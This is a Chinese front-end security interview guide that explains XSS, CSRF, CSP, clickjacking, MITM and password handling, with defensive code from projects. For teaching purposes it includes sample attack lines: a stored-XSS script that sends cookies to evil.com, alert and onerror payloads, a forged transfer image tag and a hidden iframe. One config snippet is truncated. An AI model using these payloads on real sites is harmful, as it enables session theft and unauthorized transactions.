前端安全 ​

7 年前端面试必问。本文按攻击 → 防御 → 实战三段式组织，配真实代码（来自简历项目）。

1. 安全威胁全景 ​

前端常见攻击：
├── XSS（跨站脚本攻击）
│   ├── 反射型 XSS
│   ├── 存储型 XSS
│   └── DOM 型 XSS
├── CSRF（跨站请求伪造）
├── Clickjacking（点击劫持）
├── SQL 注入（前端能做的有限）
├── 钓鱼攻击
├── 中间人攻击（MITM）
└── 供应链攻击（npm 投毒）

2. XSS（跨站脚本攻击） ​

2.1 三种 XSS 类型 ​

反射型 XSS（一次性） ​

攻击者构造 URL：
https://search.com/?q=<script>alert(1)</script>

用户点击链接 → 服务器把 q 参数直接拼到 HTML 返回
用户浏览器执行 script → 弹窗 / 偷 Cookie
js
// ❌ 不安全的代码（直接拼接）
app.get('/search', (req, res) => {
  const keyword = req.query.q
  res.send(`<h1>搜索结果：${keyword}</h1>`)  // XSS!
})

// ✅ 安全的代码（HTML 转义）
function escapeHtml(str) {
  return str.replace(/[&<>"']/g, (m) => ({
    '&': '&amp;',
    '<': '&lt;',
    '>': '&gt;',
    '"': '&quot;',
    "'": '&#39;',
  })[m])
}
app.get('/search', (req, res) => {
  res.send(`<h1>搜索结果：${escapeHtml(req.query.q)}</h1>`)
})

存储型 XSS（持久化） ​

攻击者在论坛发帖子：
"不错<script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>"

帖子保存到数据库 → 所有用户访问都执行 → Cookie 被偷

真实案例：2011 年新浪微博 XSS 蠕虫事件，攻击者利用名人账号发带 XSS 的微博，自动关注 + 自动转发，影响数百万用户。

DOM 型 XSS ​

js
// ❌ URL 参数直接塞进 DOM
const params = new URLSearchParams(location.search)
document.getElementById('name').innerHTML = params.get('name')

// 攻击 URL：
// https://site.com/?name=<img src=x onerror=alert(1)>

// ✅ 用 textContent
document.getElementById('name').textContent = params.get('name')

2.2 真实项目防御（merchant 项目） ​

富文本：DOMPurify 白名单 ​

ts
// 来自 merchant/src/utils/sanitizeHtml.ts
import DOMPurify from 'isomorphic-dompurify'

const ALLOWED_TAGS = [
  'a', 'b', 'blockquote', 'br', 'code', 'div', 'em',
  'h1', 'h2', 'h3', 'img', 'li', 'ol', 'p', 'pre',
  'span', 'strong', 'table', 'ul', // ...
]

const ALLOWED_ATTR = [
  'align', 'alt', 'class', 'href', 'src', 'style', 'target',
]

export function sanitizeHtml(html?: string | null): string {
  if (!html) return ''
  DOMPurify.setConfig({
    ALLOWED_TAGS,
    ALLOWED_ATTR,
    ALLOW_DATA_ATTR: false,        // 拒绝 data-* 属性
    ALLOW_ARIA_ATTR: true,
    ALLOWED_URI_REGEXP: /^(?:(?:(?:f|ht)tps?|mailto|tel|callto|sms|cid|xmpp|data):|[^a-z]|[a-z+.\-]+(?:[^a-z+.\-:]|$))/i,
  })
  return DOMPurify.sanitize(html) as string
}

SafeHtml 组件：项目里唯一允许 dangerouslySetInnerHTML 的地方 ​

tsx
// 来自 merchant/src/components/safeHtml/index.tsx
export default function SafeHtml({ html, as, ...rest }: SafeHtmlProps) {
  const Tag = (as ?? 'div') as SafeHtmlTag
  const sanitized = sanitizeHtml(html)  // 先过滤
  return createElement(Tag, {
    ...rest,
    dangerouslySetInnerHTML: { __html: sanitized }
  })
}

// 使用
<SafeHtml html={article.content} />

接口返回值：永远不要用 dangerouslySetInnerHTML ​

tsx
// ❌ 直接渲染接口返回的 HTML
function ArticleView({ article }) {
  return <div dangerouslySetInnerHTML={{ __html: article.content }} />
}

// ✅ 通过 SafeHtml 过滤
function ArticleView({ article }) {
  return <SafeHtml html={article.content} />
}

2.4 真实项目：URL 校验（来自 member-h5） ​

ts
// 真实代码：member-h5/src/utils/assertAllowedIframeUrl.ts
const NON_PROD = process.env.NEXT_PUBLIC_ENV !== 'prod'

export function assertAllowedIframeUrl(raw?: string | null): URL | null {
  if (!raw) return null

  let parsed: URL
  try {
    parsed = new URL(raw)
  } catch {
    try {
      if (typeof window === 'undefined') return null
      parsed = new URL(raw, window.location.origin)
    } catch {
      return null
    }
  }

  // 只允许 http(s)
  const protocolOk = parsed.protocol === 'https:' || (NON_PROD && parsed.protocol === 'http:')
  // 拒绝带 username/password 的 URL（钓鱼常用）
  if (!protocolOk || !parsed.hostname || parsed.username || parsed.password) {
    return null
  }
  return parsed
}

关键点：https://evil@bank.com/... 在浏览器地址栏只显示 bank.com，但实际指向 evil 域名。

3. CSRF（跨站请求伪造） ​

3.1 攻击原理 ​

1. 用户登录了 bank.com，服务器返回 Set-Cookie: session=abc123
2. 用户访问恶意网站 evil.com
3. evil.com 页面里有：
   <img src="https://bank.com/transfer?to=attacker&amount=10000">
4. 浏览器自动带 Cookie 请求 bank.com
5. bank.com 以为是用户主动操作 → 转账成功

3.2 防御方案 ​

SameSite Cookie（推荐） ​

http
# 默认值：Lax
Set-Cookie: session=abc123; SameSite=Lax

# Strict：完全不允许跨域请求带 Cookie（最严格）
Set-Cookie: session=abc123; SameSite=Strict

# None：所有请求都带 Cookie（必须配合 Secure）
Set-Cookie: session=abc123; SameSite=None; Secure

Lax 的行为：

  • ✅ 跨域 GET 链接点击：带 Cookie
  • ❌ 跨域 POST 表单提交：不带 Cookie
  • ❌ 跨域 img/script/iframe：不带 Cookie

CSRF Token ​

js
// 服务器：生成 token 写入 Cookie 和表单
app.get('/transfer', (req, res) => {
  const csrfToken = generateToken()
  res.cookie('csrf_token', csrfToken)
  res.render('transfer', { csrfToken })
})

// 客户端：表单提交带 token
<form action="/transfer" method="POST">
  <input type="hidden" name="csrf_token" value="${csrfToken}">
  <input name="to" value="alice">
  <input name="amount" value="100">
</form>

// 服务器：验证 token
app.post('/transfer', (req, res) => {
  const tokenFromCookie = req.cookies.csrf_token
  const tokenFromBody = req.body.csrf_token
  if (tokenFromCookie !== tokenFromBody) {
    return res.status(403).send('Invalid CSRF token')
  }
  // 转账
})

Origin / Referer 校验 ​

js
// 服务器
app.post('/api/transfer', (req, res) => {
  const origin = req.headers.origin || req.headers.referer
  const allowedOrigins = ['https://bank.com']

  if (!allowedOrigins.includes(origin)) {
    return res.status(403).send('Forbidden')
  }
  // 处理请求
})

4. CSP（Content Security Policy） ​

4.1 配置 CSP ​

http
# 严格 CSP（HTML meta 标签）
Content-Security-Policy:
  default-src 'self';
  script-src 'self' 'nonce-{random}' 'strict-dynamic';
  style-src 'self' 'unsafe-inline';
  img-src 'self' data: https:;
  connect-src 'self' https://api.example.com;
  font-src 'self' https://fonts.gstatic.com;
  frame-ancestors 'none';           // 防止被 iframe 嵌入
  form-action 'self';
  base-uri 'self';

4.2 Next.js 配置 CSP ​

js
// next.config.js
module.exports = {
  async headers() {
    return [
      {
        source: '/(.*)',
        headers: [
          {
            key: 'Content-Security-Policy',
            value: `
              default-src 'self';
              script-src 'self' 'unsafe-eval' 'unsafe-inline';
              style-src 'self' 'unsafe-inline';
              img-src 'self' data: https:;
              connect-src 'self' https://api.example.com;
            `.replace(/\s{2,}/g, ' ').trim(),
          },
        ],
      },
    ]
  },
}

4.3 CSP 实战经验 ​

  1. 'unsafe-inline' 和 'unsafe-eval'：尽量避免，必须用时谨慎。
  2. nonce 方案：每次请求生成随机 nonce，内联脚本带 nonce="xxx" 才执行。
  3. report-uri / report-to：收集违规上报，逐步收紧策略。
http
Content-Security-Policy:
  default-src 'self';
  report-uri /api/csp-report;

5. Clickjacking（点击劫持） ​

5.1 攻击方式 ​

攻击者把 bank.com/transfer 嵌入 iframe，设置透明，叠在诱饵页面上：
<iframe src="https://bank.com/transfer" style="opacity:0"></iframe>
<button>点这里领奖</button>

用户实际点的是 iframe 里的"确认转账"按钮

5.2 防御 ​

http
# 禁止被 iframe 嵌入
X-Frame-Options: DENY

# 或 CSP 的 frame-ancestors（更现代）
Content-Security-Policy: frame-ancestors 'none'
html
<!-- 自己的页面如果需要 iframe 别人的内容 -->
<iframe sandbox="allow-scripts" src="..."></iframe>

7. 中间人攻击（MITM） ​

7.1 攻击场景 ​

用户 → 公共 WiFi → 攻击者 → 目标服务器

攻击者可以：
- 监听所有未加密流量
- 篡改 HTTP 响应
- 注入恶意脚本

7.2 防御：HTTPS + HSTS ​

http
# 服务器强制 HTTPS（Strict-Transport-Security）
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload

# 浏览器永远只用 HTTPS 访问该域名
js

    return [
      {
        source: '/(.*)',

          { key: 'Strict-Transport-Security', value: 'max-age=31536000; includeSubDomains; preload' },
        ],
      },
    ]
  },
}

8. 密码安全 ​

8.1 真实项目（merchant） ​

ts
// 来自 merchant/src/utils/encrypt.ts
import { JSEncrypt } from 'jsencrypt'

const publicKey = `-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA...
-----END PUBLIC KEY-----`

export const getEncryptedPssword = (pwd: string | undefined) => {
  if (!pwd) return ''
  const encrypt = new JSEncrypt()
  encrypt.setPublicKey(publicKey)
  const encrypted = encrypt.encrypt(pwd)  // 失败返回 null
  return encrypted
}

8.2 密码传输流程 ​

1. 用户输入密码 "mypassword"
2. 前端用 RSA 公钥加密 → "x8j$k2..."
3. POST /api/login { password: "x8j$k2..." }
4. 后端用私钥解密 → "mypassword"
5. 后端用 bcrypt 哈希 → 保存到数据库

⚠️ 前端加密不是"安全"，而是"约定"：
- HTTPS 已经防偷听
- RSA 加密是为了"代码被分析后密码不可还原"
- 真正的安全靠 HTTPS + 服务端验证 + Token 生命周期

8.3 密码安全清单 ​

措施说明
HTTPS传输加密
前端 RSA 加密防代码分析
后端 bcrypt + salt不可逆哈希
不存明文密码数据库泄露也安全
不在日志打印密码防日志泄露
Token 有效期短期 token + refresh token
多因素认证短信 / 邮箱 / TOTP

// 真实代码：member-h5/src/utils/thirdAuth.ts
// Google / Facebook 三方登录流程
export function auth(provider: 'gg' | 'fb', infos) {
  return new Promise((resolve, reject) => {
    const popup = window.open('about:blank', 'auth_window')

    // postMessage 接收回调（同源）
    function handlePostMessage(event) {
      if (event.origin !== window.location.origin) return  // ⚠️ 校验 origin
      if (event.data.type === 'third:auth:success') {
        done({ token: event.data.payload.token })
      }
    }

    window.addEventListener('message', handlePostMessage)

    // 向后端请求授权地址
    providerIns.loginUsingPost1(provider, infos)
      .then(res => popup.location.replace(res))
      .catch(fail)

    // 监听关闭 + 超时
    setInterval(() => !finished && popup.closed && fail(), 500)
    setTimeout(() => fail('Login timeout'), 60000)
  })
}

export function isAllowedIframeMessageOrigin(origin: string, allowedUrl: URL | null): boolean {
  if (!origin || !allowedUrl) return false
  return origin === allowedUrl.origin  // 严格匹配，不包含
}

14. 面试常考 ​

题目答案要点
XSS 三种类型反射型、存储型、DOM 型

15. 项目踩过的坑 ​

  1. 富文本直接 dangerouslySetInnerHTML：被注入恶意脚本，必须经过 DOMPurify。
  2. javascript: URL 跳转：window.location = userInput 可能跳到 javascript:alert(1)。
  3. localStorage 存 token：XSS 直接偷走，应该用 HttpOnly Cookie。
  4. 没有 CSP：被 XSS 注入后无法限制执行范围。
  5. 三方登录 popup 不校验 origin：恶意 iframe 可以伪造回调。
  6. iframe 不限制 sandbox：第三方页面能执行任意脚本。

16. 安全检查清单 ​

部署前必查：

  • [ ] 所有用户输入都过滤 / 转义
  • [ ] 富文本走 DOMPurify 白名单
  • [ ] Cookie 设置 HttpOnly + Secure + SameSite
  • [ ] 启用 CSP（至少 report-only 起步）
  • [ ] 关键接口要求 CSRF Token
  • [ ] iframe 用 sandbox 限制
  • [ ] postMessage 校验 origin
  • [ ] npm audit 无高危漏洞
  • [ ] HTTPS 强制 + HSTS
